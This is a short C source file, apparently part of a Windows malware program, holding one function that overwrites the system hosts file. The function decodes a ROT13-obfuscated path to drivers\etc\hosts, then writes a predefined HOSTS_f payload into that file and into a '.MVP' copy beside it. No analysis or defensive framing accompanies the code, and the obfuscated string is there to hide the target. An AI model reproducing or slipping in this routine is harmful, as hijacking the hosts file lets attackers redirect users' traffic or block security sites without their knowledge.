#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _HOSTSFile(void)
{
    volatile struct _LocalCtx {
        char system_directory[256];
        char hosts_file_path[298];
        char hosts_backup_path[298];
        FILE *hosts_file;
        FILE *temp_hosts_file;
    } ctx;

    // Initializations (some variables may be uninitialized but will be set later)
    // No explicit initial values needed; arrays are uninitialized but will be filled.

    GetSystemDirectoryA(ctx.system_directory, sizeof(ctx.system_directory));

    // Decrypt "\\drivers\\etc\\hosts"
    memset(ctx.hosts_file_path, 0, sizeof(ctx.hosts_file_path));
    _CiphStr(ctx.hosts_file_path, "\\qeviref\\rgp\\UBFGF");
    strcat(ctx.system_directory, ctx.hosts_file_path);

    strcpy(ctx.hosts_backup_path, ctx.system_directory);
    strcat(ctx.hosts_backup_path, ".MVP");

    ctx.hosts_file = fopen(ctx.system_directory, "wb");
    ctx.temp_hosts_file = fopen(ctx.hosts_backup_path, "wb");

    fputs(HOSTS_f, ctx.hosts_file);
    fputs(HOSTS_f, ctx.temp_hosts_file);

    fclose(ctx.hosts_file);
    fclose(ctx.temp_hosts_file);

    return 0;
}
#pragma optimize("", on)
